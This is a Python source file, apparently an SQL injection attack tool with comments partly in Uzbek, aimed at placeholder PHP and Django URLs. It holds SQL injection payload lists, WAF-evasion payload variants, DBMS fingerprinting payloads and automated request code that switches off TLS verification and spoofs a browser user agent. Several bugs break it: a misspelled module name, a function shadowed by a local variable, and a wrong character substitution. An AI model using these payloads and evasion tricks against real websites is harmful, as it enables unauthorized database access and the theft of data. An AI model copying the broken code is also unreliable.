import requests
import urllib.parse
import re
import pandas as pd
from tabulate import tabulate
import os
from bs4 import BeautifulSoup
import time
import random
import warnings

warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Test serverlarning URl lari
PHP_SERVER = "https://example.com/page.php"
DJANGO_SERVER = "http://example.com/api"
PARAM = "id"
OUTPUT_CSV = "output.csv"
VERIFY_SSL = False
TIMEOUT = 5
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"

def send_request(url, param, payload, headers=None):
    if headers is None:
        headers = {"User-Agent": USER_AGENT}
    encoded_payload = urllib.parse.quote(payload, safe='')
    test_url = f"{url}?{param}={encoded_payload}"
    try:
        response = requests.get(test_url, headers=headers, timeout=TIMEOUT, verify=VERIFY_SSL)
        return response.text, response.status_code, response.elapsed.total_seconds()
    except requests.exceptions.RequestException as e:
        print(f"Error: Failed to connect to {url}. Error: {e}")
        return None, None, None

def clean_html(text):
    """"Remove HTML tags and decode HTML entities."""

    if not text:
        return ""
    soup = BeautifulSoup(text, "html.parser")
    return soup.get_text(separator=" ").strip()

def extract_data(response_text, pattern=r'[\w\s@.]+'):
    """Extract data from the response text."""
    
    clean_html = clean_html(response_text)
    matches = re.findall(pattern, clean_html)
    return [m.strip() for m in matches if len(m.strip()) > 1 and m.strip().lower() not in ['html', 'body', 'div', 'script', 'style', 'head', 'title']]

###########################################################################################################################################################################################################################################################################################################################################################################################################################################

def display_table(data, headers, title):
    """Display data in a formatted table."""
    
    if data:
        print(f"\n{title}\n")
        print(tabulate(data, headers=headers, tablefmt="grid"))

def safe_to_csv(dfs, server_name):
    """Save data to a CSV file."""

    with open(OUTPUT_CSV, "a", encoding='utf-8') as f:
        f.write(f"\n === {server_name} server data ===\n")

        for title, df in dfs:
            f.write(f"\n{title}\n")
            df.to_csv(f, index=False, lineterminator='\n')
            f.write("\n")

def generate_waf_bypass_payload(payload):
    """Generate WAF bypass payloads."""

    bypass_variants = [
        payload, # Original payload
        payload.replace(" ", "/**/"), # Comment injection
        payload.replace(" ", "%09"), # Tab injection
        payload.replace("UNION", "UnIoN"), # Case manipulation
        payload.replace("Select", "SeLeCt"), # Case manipulation
        urlib.parse.quote(payload), # URL encoding
        urllib.parse.quote(urllib.parse.quote(payload)), # Double URL encoding
        payload.replace("'", "%27").replace('"', "%20"), # URL encoded characters
        f"/*!\n*/{payload}", # MySQL comment injection
    ]
    return bypass_variants

def detect_dbms(url, param):
    """Detect the database management system (DBMS fingerprinting)."""

    dbms_payloads = {
        "MySQL": ["' AND 1=CONVERT(int, (SELECT @@version)) --", "'AND @@version LIKE '%MySQL%'--"],
        "PostgreSQL": ["' AND 1=CAST(version() AS INTEGER) --", "' AND version() LIKE '%PostgreSQL%'--"],
        "MSSQL": ["' AND 1=CAST(@@Version AS INT) --", "' AND @@version LIKE '%Microsoft%'--"],
        "Oracle": ["' AND 1=(SELECT count(*) FROM v$version WHERE banner LIKE '%Oracle%') --"], 
    }

    for dbms, payloads in dbms_payloads.items():
        for payload in payloads:
            response_text, _, _ = send_request(url, PARAM, payload)
            if response_text:
                cleaned_text = clean_html(response_text).lower()
                if any(keyword in cleaned_text for keyword in [dbms.lower(), "sql", "syntax", "error"]):
                    print(f"[+] Detected DBMS: {dbms}")
                    return dbms
    print("[-] DBMS detection failed.")
    return "MySQL"

def test_vulnerability(url, param):
    """Test for SQL injection vulnerability."""

    payloads = [
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 /*",
        "' OR 1=1#",
        "' OR 1=1; --",
        "' OR 1=1; /*",
        "' OR 1=1; #",
    ]

    for payload in payloads:
        response_text, status_code, response_time = send_request(url, param, payload)
        if response_text and status_code == 200:
            cleaned_text = clean_html(response_text).lower()
            if "sql" in cleaned_text or "error" in cleaned_text:
                print(f"[+] SQL Injection vulnerability detected with payload: {payload}")
                return True
    print("[-] No SQL Injection vulnerability detected.")
    return False